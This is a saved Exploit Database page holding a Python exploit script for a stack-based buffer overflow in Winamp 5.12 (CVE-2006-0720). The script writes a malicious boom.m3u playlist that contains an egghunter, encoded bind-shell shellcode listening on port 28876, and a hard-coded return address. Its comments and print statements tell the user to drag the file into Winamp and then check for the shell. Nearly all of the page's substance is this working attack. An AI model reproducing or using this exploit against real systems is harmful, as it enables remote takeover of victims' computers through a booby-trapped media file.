<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<!-- saved from url=(0041)http://www.exploit-db.com/exploits/26245/ -->
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		
		<title>Winamp 5.12 (.m3u) - Stack Based Buffer Overflow</title>
		<meta name="description" content="">
		<meta name="keywords" content="">
		<script type="text/javascript" src="./Winamp 5.12 (.m3u) - Stack Based Buffer Overflow_files/shCore.js"></script>
		<script type="text/javascript" src="./Winamp 5.12 (.m3u) - Stack Based Buffer Overflow_files/shBrushPlain.js"></script>
					<script type="text/javascript" src="./Winamp 5.12 (.m3u) - Stack Based Buffer Overflow_files/shBrushPython.js"></script>
		        <script type="text/javascript" src="./Winamp 5.12 (.m3u) - Stack Based Buffer Overflow_files/jquery-1.4.2.min.js"></script>
        <script type="text/javascript" src="./Winamp 5.12 (.m3u) - Stack Based Buffer Overflow_files/jquery.rating.pack.js"></script>
        <script type="text/javascript" src="./Winamp 5.12 (.m3u) - Stack Based Buffer Overflow_files/jquery.fancybox-1.3.1.pack.js"></script>
        <link rel="stylesheet" href="./Winamp 5.12 (.m3u) - Stack Based Buffer Overflow_files/jquery.fancybox-1.3.1.css" type="text/css" media="screen">
        <link type="text/css" rel="stylesheet" href="./Winamp 5.12 (.m3u) - Stack Based Buffer Overflow_files/shCore.css">
        <link type="text/css" rel="stylesheet" href="./Winamp 5.12 (.m3u) - Stack Based Buffer Overflow_files/shThemeDefault.css">
        <link type="text/css" rel="stylesheet" href="./Winamp 5.12 (.m3u) - Stack Based Buffer Overflow_files/jquery.rating.css">
        <link type="text/css" rel="stylesheet" href="./Winamp 5.12 (.m3u) - Stack Based Buffer Overflow_files/exploit.css">
		<link rel="stylesheet" id="shutter-css" href="./Winamp 5.12 (.m3u) - Stack Based Buffer Overflow_files/shutter-reloaded.css" type="text/css" media="screen">
		<link type="text/css" rel="stylesheet" href="./Winamp 5.12 (.m3u) - Stack Based Buffer Overflow_files/digi.css">

		<style type="text/css">
		h1 {
		font-size:22px !important;
		}
		.barColor {
		display:table;
		clear:both;
		background-color:#d5d7dd;
		width:1280px;
		border:solid #aaa 1px;
		-webkit-border-radius:5px;
		-moz-border-radius:5px;
		border-radius:5px;
		margin:10px auto 10px auto;
		}
		body {
		background-color:#292929;
		margin:0px;
		font-size:14px;
		}
		#container {
		display:block;
		background-color:#fff;
		width:1270px;
		position:relative;
		left:0px;
		padding:0 0 0 10px;
		margin:0 auto -40px auto;
		/*border:solid #ddd 1px;*/
		-webkit-border-radius:5px;
		-moz-border-radius:5px;
		border-radius:5px;
		}
		pre {
		width:1200px !important;
		overflow:auto !important;
		}
		table {
		background-color:#f5f5f5;
		border:solid #aaa 1px;
		-webkit-border-radius:5px;
		-moz-border-radius:5px;
		border-radius:5px;
		}
		
		tr.meta td {font-weight:bold; color:#606060;}
		table.comment.odd {
		width:710px;
		background-color:#f8f8f8;
		padding:10px;
		margin:10px;
		border:solid #ccc 1px;
		margin-left:auto; margin-right:auto;
		}

		table.comment.even {
		width:710px;
		background-color:#f8f8f8;
		padding:10px;
		margin:10px;
		border:solid #ccc 1px;
		margin-left:auto; margin-right:auto;
		}
		a img {
		border:none;
		border-style:none;
		}
		#screenshot_upload_form {
		margin: 0px auto 10px auto;
		}
		</style>
        <script type="text/javascript">
        	//SyntaxHighlighter.config.bloggerMode = true;
			SyntaxHighlighter.all();
        </script>
	</head>
	<body>
<div class="barColor">
		
	<div id="topAd" style="position:relative; float:right; margin:5px 20px 5px 20px;">
		<script type="text/javascript"><!--
		google_ad_client = "ca-pub-0054251952045395";
		/* Exploit Database Rectangle */
		google_ad_slot = "6779138874";
		google_ad_width = 336;
		google_ad_height = 280;
		//-->
		</script>
		<script type="text/javascript" src="./Winamp 5.12 (.m3u) - Stack Based Buffer Overflow_files/show_ads.js">
		</script><ins style="display:inline-table;border:none;height:280px;margin:0;padding:0;position:relative;visibility:visible;width:336px;background-color:transparent"><ins id="aswift_0_anchor" style="display:block;border:none;height:280px;margin:0;padding:0;position:relative;visibility:visible;width:336px;background-color:transparent"><iframe width="336" height="280" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" onload="var i=this.id,s=window.google_iframe_oncopy,H=s&amp;&amp;s.handlers,h=H&amp;&amp;H[i],w=this.contentWindow,d;try{d=w.document}catch(e){}if(h&amp;&amp;d&amp;&amp;(!d.body||!d.body.firstChild)){if(h.call){setTimeout(h,0)}else if(h.match){w.location.replace(h)}}" id="aswift_0" name="aswift_0" style="left:0;position:absolute;top:0;"></iframe></ins></ins>
	</div>
					<h1 style="position:relative; left:30px;">Winamp 5.12 (.m3u) - Stack Based Buffer Overflow</h1>
		
		<br><br>

		<table style=" position:relative; left:50px; top:-10px; height:110px; float:left;">
		
			<tbody><tr>
			<td style="background-color:#fff; padding:5px;">EDB-ID: <span class="r1">26245</span> </td>
			<td style="background-color:#fff; padding:5px;">  CVE:  <a rel="nofollow" href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-0720" target="_blank">2006-0720</a></td>
			<td style="background-color:#fff; padding:5px;">OSVDB-ID: <a rel="nofollow" href="http://osvdb.org/show/osvdb/23525" target="_blank">23525</a></td>
			</tr>
				
			<tr>
			<td style="background-color:#fff; padding:5px;">Author: superkojiman</td>
			<td style="background-color:#fff; padding:5px;">Published: 2013-06-17</td>
			<td style="background-color:#fff; padding:5px;">Verified: <img src="./Winamp 5.12 (.m3u) - Stack Based Buffer Overflow_files/accept.png" alt="Verified"></td>
			</tr>
			
			<tr>
			<td style="background-color:#fff; padding:5px;">Exploit Code: &nbsp;&nbsp;<a href="http://www.exploit-db.com/download/26245"><img src="./Winamp 5.12 (.m3u) - Stack Based Buffer Overflow_files/46.png" style="position:relative; top:5px;" alt="Download" title="Download" border="0"></a></td>
			<td style="background-color:#fff; padding:5px;">Vulnerable App: &nbsp;&nbsp; <a href="http://www.exploit-db.com/wp-content/themes/exploit/applications/1a53cc0178b211cfd85df7b00c47ab0b-winamp512_full.exe"><img src="./Winamp 5.12 (.m3u) - Stack Based Buffer Overflow_files/46.png" style="position:relative; top:5px;" alt="Download" title="Download" border="0"></a></td>
			<td style="background-color:#fff; padding:5px;">
			
			
			
			</td>
			</tr>
		</tbody></table>
		
		<table style="position:relative; top:-10px; height:110px;  float:left; margin-left:60px;">
		<tbody><tr><td style="background-color:#fff; margin:5px;">
		<div id="rating2">
			
			<h2 style="margin-bottom:0px; font-size:14px;">Rating</h2>
			<form action="" method="post">
				<label class="star-rating-readonly">Overall:</label>
				<span class="star-rating-control star-rating-readonly"><div class="rating-cancel star-rating-readonly" style="display: none; "><a title="Cancel Rating"></a></div><div class="star-rating rater-0 star total-rating star-rating-applied star-rating-live star-rating-readonly"><a title="1">1</a></div><div class="star-rating rater-0 star total-rating star-rating-applied star-rating-live star-rating-readonly"><a title="2">2</a></div><div class="star-rating rater-0 star total-rating star-rating-applied star-rating-live star-rating-readonly"><a title="3">3</a></div><div class="star-rating rater-0 star total-rating star-rating-applied star-rating-live star-rating-readonly"><a title="4">4</a></div><div class="star-rating rater-0 star total-rating star-rating-applied star-rating-live star-rating-readonly"><a title="5">5</a></div></span><input name="rate" type="radio" class="star total-rating star-rating-applied star-rating-readonly" value="1" style="display: none; ">
				<input name="rate" type="radio" class="star total-rating star-rating-applied star-rating-readonly" value="2" style="display: none; ">
				<input name="rate" type="radio" class="star total-rating star-rating-applied star-rating-readonly" value="3" style="display: none; ">
				<input name="rate" type="radio" class="star total-rating star-rating-applied star-rating-readonly" value="4" style="display: none; ">
				<input name="rate" type="radio" class="star total-rating star-rating-applied star-rating-readonly" value="5" style="display: none; ">
				<span class="num_value star-rating-readonly">
					(0.0)				</span>
			</form>
			<div class="clear"></div>
							<!-- 
				<p><a href="http://www.exploit-db.com/?page_id=1321?redirect_to=http://www.exploit-db.com/exploits/26245">Login</a>/<a href="">Register</a> to be able to rate exploits</p>
				 -->
						<script type="text/javascript">
			$(document).ready(function(){
				$('input.total-rating').rating('readOnly');
				$('input.my-rate').rating('readOnly');
				$("a#single_image").fancybox();
			});
			</script>
		</div> <!--end of #rating-->
		
		</td></tr></tbody></table>
		
		<div style="display:table; table-layout:fixed; width:700px; float:left; margin-left:30px;">
		
				
			<a style="text-decoration:none; color:#000;" href="http://www.exploit-db.com/exploits/26244/"><img src="./Winamp 5.12 (.m3u) - Stack Based Buffer Overflow_files/prev.png" alt="Prev" style="border:none; border-style:none;"></a>
						
			 <a style="text-decoration:none; color:#000;" href="http://www.exploit-db.com/"><img src="./Winamp 5.12 (.m3u) - Stack Based Buffer Overflow_files/back.png" alt="Home" style="border:none; border-style:none;"></a>
			
						<a style="text-decoration:none; color:#000;" href="http://www.exploit-db.com/exploits/26246/"><img src="./Winamp 5.12 (.m3u) - Stack Based Buffer Overflow_files/next.png" alt="Next" style="border:none; border-style:none;"></a>
					</div>

</div><!--// top color //-->
		

		 		
		<div id="container">
			<div><div id="highlighter_435086" class="syntaxhighlighter  py"><div class="toolbar"><span><a href="http://www.exploit-db.com/exploits/26245/#" class="toolbar_item command_help help">?</a></span></div><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div><div class="line number32 index31 alt1">32</div><div class="line number33 index32 alt2">33</div><div class="line number34 index33 alt1">34</div><div class="line number35 index34 alt2">35</div><div class="line number36 index35 alt1">36</div><div class="line number37 index36 alt2">37</div><div class="line number38 index37 alt1">38</div><div class="line number39 index38 alt2">39</div><div class="line number40 index39 alt1">40</div><div class="line number41 index40 alt2">41</div><div class="line number42 index41 alt1">42</div><div class="line number43 index42 alt2">43</div><div class="line number44 index43 alt1">44</div><div class="line number45 index44 alt2">45</div><div class="line number46 index45 alt1">46</div><div class="line number47 index46 alt2">47</div><div class="line number48 index47 alt1">48</div><div class="line number49 index48 alt2">49</div><div class="line number50 index49 alt1">50</div><div class="line number51 index50 alt2">51</div><div class="line number52 index51 alt1">52</div><div class="line number53 index52 alt2">53</div><div class="line number54 index53 alt1">54</div><div class="line number55 index54 alt2">55</div><div class="line number56 index55 alt1">56</div><div class="line number57 index56 alt2">57</div><div class="line number58 index57 alt1">58</div><div class="line number59 index58 alt2">59</div><div class="line number60 index59 alt1">60</div><div class="line number61 index60 alt2">61</div><div class="line number62 index61 alt1">62</div><div class="line number63 index62 alt2">63</div><div class="line number64 index63 alt1">64</div><div class="line number65 index64 alt2">65</div><div class="line number66 index65 alt1">66</div><div class="line number67 index66 alt2">67</div><div class="line number68 index67 alt1">68</div><div class="line number69 index68 alt2">69</div><div class="line number70 index69 alt1">70</div><div class="line number71 index70 alt2">71</div><div class="line number72 index71 alt1">72</div><div class="line number73 index72 alt2">73</div><div class="line number74 index73 alt1">74</div><div class="line number75 index74 alt2">75</div><div class="line number76 index75 alt1">76</div><div class="line number77 index76 alt2">77</div><div class="line number78 index77 alt1">78</div><div class="line number79 index78 alt2">79</div><div class="line number80 index79 alt1">80</div><div class="line number81 index80 alt2">81</div><div class="line number82 index81 alt1">82</div><div class="line number83 index82 alt2">83</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="py comments"># Exploit Title: Winamp 5.12 .m3u stack based buffer overflow</code></div><div class="line number2 index1 alt1"><code class="py comments"># Date: 16 June 2013</code></div><div class="line number3 index2 alt2"><code class="py comments"># Exploit Author: superkojiman - http://www.techorganic.com</code></div><div class="line number4 index3 alt1"><code class="py comments"># Vendor Homepage: http://www.winamp.com/</code></div><div class="line number5 index4 alt2"><code class="py comments"># Software Link: http://www.oldapps.com/winamp.php?old_winamp=211</code></div><div class="line number6 index5 alt1"><code class="py comments"># Version: 5.12</code></div><div class="line number7 index6 alt2"><code class="py comments"># Tested on: Windows XP Professional SP2, English</code></div><div class="line number8 index7 alt1"><code class="py comments"># CVE: CVE-2006-0720</code></div><div class="line number9 index8 alt2"><code class="py comments"># BID: 16785</code></div><div class="line number10 index9 alt1"><code class="py comments">#</code></div><div class="line number11 index10 alt2"><code class="py comments"># Description from CVE-2006-0720</code></div><div class="line number12 index11 alt1"><code class="py comments"># Stack-based buffer overflow in Nullsoft Winamp 5.12 and 5.13 </code></div><div class="line number13 index12 alt2"><code class="py comments"># allows user-assisted attackers to cause a denial of service </code></div><div class="line number14 index13 alt1"><code class="py comments"># (crash) and possibly execute arbitrary code via a crafted </code></div><div class="line number15 index14 alt2"><code class="py comments"># .m3u file that causes an incorrect strncpy function call </code></div><div class="line number16 index15 alt1"><code class="py comments"># when the player pauses or stops the file.</code></div><div class="line number17 index16 alt2"><code class="py comments">#</code></div><div class="line number18 index17 alt1"><code class="py comments">#</code></div><div class="line number19 index18 alt2"><code class="py comments"># 1. Launch Winamp</code></div><div class="line number20 index19 alt1"><code class="py comments"># 2. Drag boom.m3u into Winamp window </code></div><div class="line number21 index20 alt2"><code class="py comments"># 3. Check for bind shell on port 28876</code></div><div class="line number22 index21 alt1"><code class="py comments">#</code></div><div class="line number23 index22 alt2">&nbsp;</div><div class="line number24 index23 alt1"><code class="py keyword">import</code> <code class="py plain">struct</code></div><div class="line number25 index24 alt2">&nbsp;</div><div class="line number26 index25 alt1"><code class="py plain">header </code><code class="py keyword">=</code>&nbsp; <code class="py string">"#EXTM3U\n"</code></div><div class="line number27 index26 alt2"><code class="py plain">header </code><code class="py keyword">+</code><code class="py keyword">=</code> <code class="py string">"#EXTINF:1234,Pwnage Rock\n"</code></div><div class="line number28 index27 alt1">&nbsp;</div><div class="line number29 index28 alt2"><code class="py comments"># NTDisplayString</code></div><div class="line number30 index29 alt1"><code class="py plain">egghunter </code><code class="py keyword">=</code> <code class="py plain">(</code></div><div class="line number31 index30 alt2"><code class="py string">"\x90"</code> <code class="py keyword">*</code> <code class="py value">64</code> <code class="py keyword">+</code></div><div class="line number32 index31 alt1"><code class="py string">"\x66\x81\xca\xff\x0f\x42\x52\x6a\x43\x58"</code> <code class="py keyword">+</code></div><div class="line number33 index32 alt2"><code class="py string">"\xcd\x2e\x3c\x05\x5a\x74\xef\xb8"</code> <code class="py keyword">+</code></div><div class="line number34 index33 alt1"><code class="py string">"\x77\x30\x30\x74"</code> <code class="py keyword">+</code> <code class="py comments"># w00t</code></div><div class="line number35 index34 alt2"><code class="py string">"\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"</code> <code class="py keyword">+</code></div><div class="line number36 index35 alt1"><code class="py string">"\x90"</code> <code class="py keyword">*</code> <code class="py value">30</code></div><div class="line number37 index36 alt2"><code class="py plain">)</code></div><div class="line number38 index37 alt1">&nbsp;</div><div class="line number39 index38 alt2"><code class="py plain">junk </code><code class="py keyword">=</code> <code class="py string">"\x41"</code> <code class="py keyword">*</code> <code class="py value">262</code> <code class="py keyword">+</code> <code class="py string">"\x90"</code> <code class="py keyword">*</code> <code class="py value">100</code> <code class="py keyword">+</code> <code class="py plain">egghunter</code></div><div class="line number40 index39 alt1">&nbsp;</div><div class="line number41 index40 alt2"><code class="py comments"># bind shell on port 28876</code></div><div class="line number42 index41 alt1"><code class="py comments"># https://code.google.com/p/w32-bind-ngs-shellcode/</code></div><div class="line number43 index42 alt2"><code class="py comments"># msfencode -i w32-bind-ngs-shellcode.bin -b "\x00\x0a\x0d\x5c"</code></div><div class="line number44 index43 alt1"><code class="py comments"># [*] x86/shikata_ga_nai succeeded with size 241 (iteration=1)</code></div><div class="line number45 index44 alt2"><code class="py plain">shellcode </code><code class="py keyword">=</code> <code class="py plain">(</code></div><div class="line number46 index45 alt1"><code class="py string">"w00tw00t"</code> <code class="py keyword">+</code> <code class="py string">"\x90"</code> <code class="py keyword">*</code> <code class="py value">239</code> <code class="py keyword">+</code></div><div class="line number47 index46 alt2"><code class="py string">"\xbf\x26\x63\xb2\x20\xda\xcc\xd9\x74\x24\xf4\x5a\x33\xc9"</code> <code class="py keyword">+</code></div><div class="line number48 index47 alt1"><code class="py string">"\xb1\x36\x83\xea\xfc\x31\x7a\x10\x03\x7a\x10\xc4\x96\x83"</code> <code class="py keyword">+</code></div><div class="line number49 index48 alt2"><code class="py string">"\xe9\x6c\xd2\x95\xd9\xe7\x92\x59\x91\x81\x46\xe9\xcb\x65"</code> <code class="py keyword">+</code></div><div class="line number50 index49 alt1"><code class="py string">"\xfc\x93\x33\xfe\x34\x54\x7b\x18\x4c\x57\xd2\x70\x9c\xc8"</code> <code class="py keyword">+</code></div><div class="line number51 index50 alt2"><code class="py string">"\xe6\xb2\x88\x90\x5e\xc5\x3b\x35\xe8\xa6\xb5\x5d\x9f\x5e"</code> <code class="py keyword">+</code></div><div class="line number52 index51 alt1"><code class="py string">"\x70\x5e\x89\x52\x52\xad\x40\x8d\x73\xde\xf9\x10\x2d\x60"</code> <code class="py keyword">+</code></div><div class="line number53 index52 alt2"><code class="py string">"\xaf\xc5\x9c\xe1\xa0\xc5\xba\xa9\xb5\x48\xff\xbe\x96\x6f"</code> <code class="py keyword">+</code></div><div class="line number54 index53 alt1"><code class="py string">"\x87\xc1\xcd\x04\x3c\xe2\x10\xf3\x95\xd3\xc0\x41\x91\x20"</code> <code class="py keyword">+</code></div><div class="line number55 index54 alt2"><code class="py string">"\x74\x44\x4b\xfc\x40\xea\xa7\x8c\x84\x36\xfb\x1f\xa0\x41"</code> <code class="py keyword">+</code></div><div class="line number56 index55 alt1"><code class="py string">"\x3e\xc7\x3f\x46\x61\x8c\x8b\xbc\x9f\x7b\x04\x0b\x8b\x2a"</code> <code class="py keyword">+</code></div><div class="line number57 index56 alt2"><code class="py string">"\x90\x38\xa8\xcd\x4f\x37\x38\xce\x8b\xd6\x12\x51\xad\xd1"</code> <code class="py keyword">+</code></div><div class="line number58 index57 alt1"><code class="py string">"\x11\x5a\x5f\xbf\xdd\x09\xa0\xef\x89\x38\xde\x31\x45\x36"</code> <code class="py keyword">+</code></div><div class="line number59 index58 alt2"><code class="py string">"\x6e\x13\x04\x47\x40\x06\xa9\x68\xf4\xd9\x79\x77\x08\x56"</code> <code class="py keyword">+</code></div><div class="line number60 index59 alt1"><code class="py string">"\xb6\xed\xe7\x3f\x14\xa4\xf8\x6f\xe3\x87\x73\x77\xdd\xd5"</code> <code class="py keyword">+</code></div><div class="line number61 index60 alt2"><code class="py string">"\x2e\xef\x7d\xb7\xaa\xcf\x0c\x3b\x17\x37\xa4\x6f\xfc\x81"</code> <code class="py keyword">+</code></div><div class="line number62 index61 alt1"><code class="py string">"\xfd\x86\x02\x59\x85\x65\x21\x36\xdb\xc7\x7b\x7e\x9c\x08"</code> <code class="py keyword">+</code></div><div class="line number63 index62 alt2"><code class="py string">"\x73\x29\x71\x85\xd3\x87\x8a\x7f\x38\xac\x33\x7c\x29\x78"</code> <code class="py keyword">+</code></div><div class="line number64 index63 alt1"><code class="py string">"\x44\x83\x55"</code></div><div class="line number65 index64 alt2"><code class="py plain">)</code></div><div class="line number66 index65 alt1">&nbsp;</div><div class="line number67 index66 alt2"><code class="py comments"># 022B368C , call ecx , C:\Progam Files\Winamp\pxsdkpls.dll</code></div><div class="line number68 index67 alt1"><code class="py plain">ret </code><code class="py keyword">=</code> <code class="py plain">struct.pack(</code><code class="py string">"&lt;I"</code><code class="py plain">, </code><code class="py value">0x022B368C</code><code class="py plain">)</code></div><div class="line number69 index68 alt2">&nbsp;</div><div class="line number70 index69 alt1"><code class="py comments"># for some reason eip doesn't get overwritten and Winamp </code></div><div class="line number71 index70 alt2"><code class="py comments"># crashes differently unless the 4th byte after ret is</code></div><div class="line number72 index71 alt1"><code class="py comments"># a 0xB0. there's probably an easier way to do this but </code></div><div class="line number73 index72 alt2"><code class="py comments"># this is what the fuzzer found first so...</code></div><div class="line number74 index73 alt1"><code class="py plain">wtf </code><code class="py keyword">=</code> <code class="py string">"\x43\x43\x43\xB0"</code></div><div class="line number75 index74 alt2">&nbsp;</div><div class="line number76 index75 alt1"><code class="py plain">f </code><code class="py keyword">=</code> <code class="py functions">open</code><code class="py plain">(</code><code class="py string">"boom.m3u"</code><code class="py plain">, </code><code class="py string">"w"</code><code class="py plain">)</code></div><div class="line number77 index76 alt2"><code class="py plain">f.write(header </code><code class="py keyword">+</code> <code class="py plain">junk </code><code class="py keyword">+</code> <code class="py plain">shellcode </code><code class="py keyword">+</code> <code class="py plain">ret </code><code class="py keyword">+</code> <code class="py plain">wtf)</code></div><div class="line number78 index77 alt1"><code class="py plain">f.close()</code></div><div class="line number79 index78 alt2">&nbsp;</div><div class="line number80 index79 alt1"><code class="py keyword">print</code> <code class="py string">"Created boom.m3u"</code></div><div class="line number81 index80 alt2"><code class="py functions">print</code> <code class="py string">"1. Open Winamp"</code></div><div class="line number82 index81 alt1"><code class="py functions">print</code> <code class="py string">"2. Drag boom.m3u into Winamp window"</code></div><div class="line number83 index82 alt2"><code class="py functions">print</code> <code class="py string">"3. Check for bind shell on port 28876"</code></div></div></td></tr></tbody></table></div></div>
		</div>
<br><br><br>

<div class="barColor">		
<center>
<br><br>
<script type="text/javascript"><!--
google_ad_client = "ca-pub-0054251952045395";
/* Exploit single page ad */
google_ad_slot = "4301625741";
google_ad_width = 728;
google_ad_height = 90;
//-->
</script>
<script type="text/javascript" src="./Winamp 5.12 (.m3u) - Stack Based Buffer Overflow_files/show_ads.js">
</script><ins style="display:inline-table;border:none;height:90px;margin:0;padding:0;position:relative;visibility:visible;width:728px;background-color:transparent"><ins id="aswift_1_anchor" style="display:block;border:none;height:90px;margin:0;padding:0;position:relative;visibility:visible;width:728px;background-color:transparent"><iframe width="728" height="90" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" onload="var i=this.id,s=window.google_iframe_oncopy,H=s&amp;&amp;s.handlers,h=H&amp;&amp;H[i],w=this.contentWindow,d;try{d=w.document}catch(e){}if(h&amp;&amp;d&amp;&amp;(!d.body||!d.body.firstChild)){if(h.call){setTimeout(h,0)}else if(h.match){w.location.replace(h)}}" id="aswift_1" name="aswift_1" style="left:0;position:absolute;top:0;"></iframe></ins></ins>
</center>
	
		<script type="text/javascript">
		function toggle(obj) {
			var el = document.getElementById(obj);
			el.style.display = (el.style.display != 'none' ? 'none' : 'block' );
		}
		</script>
		
		<br>

		<fieldset id="digicomments" style="width:755px;  margin-left:auto; margin-right:auto; background-color:#eaeaea;"> 
		<legend>Comments</legend>
		<div id="comments2">
			
										<h3>No comments so far</h3>
										<!-- <p><a href="http://www.exploit-db.com/?page_id=1321?redirect_to=http://www.exploit-db.com/exploits/26245">Login</a>/<a href="http://www.exploit-db.com/?page_id=1323">Register</a> to be able to post comments</p> -->
					</div>
		</fieldset>

<br><br>
<center>
<div id="footer">


<br><br>

        Â© Offensive Security 2013</div></center>
			<script type="text/javascript">
				var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
				document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
			</script><script src="./Winamp 5.12 (.m3u) - Stack Based Buffer Overflow_files/ga.js" type="text/javascript"></script>
			<script type="text/javascript">
				try {
					var pageTracker = _gat._getTracker("UA-1981501-4");
					pageTracker._trackPageview();
					} catch(err) {}
			</script>	
		</div>


<div id="fancybox-tmp"></div><div id="fancybox-loading"><div></div></div><div id="fancybox-overlay"></div><div id="fancybox-wrap"><div id="fancybox-outer"><div class="fancy-bg" id="fancy-bg-n"></div><div class="fancy-bg" id="fancy-bg-ne"></div><div class="fancy-bg" id="fancy-bg-e"></div><div class="fancy-bg" id="fancy-bg-se"></div><div class="fancy-bg" id="fancy-bg-s"></div><div class="fancy-bg" id="fancy-bg-sw"></div><div class="fancy-bg" id="fancy-bg-w"></div><div class="fancy-bg" id="fancy-bg-nw"></div><div id="fancybox-inner"></div><a id="fancybox-close"></a><a href="javascript:;" id="fancybox-left"><span class="fancy-ico" id="fancybox-left-ico"></span></a><a href="javascript:;" id="fancybox-right"><span class="fancy-ico" id="fancybox-right-ico"></span></a></div></div></body></html>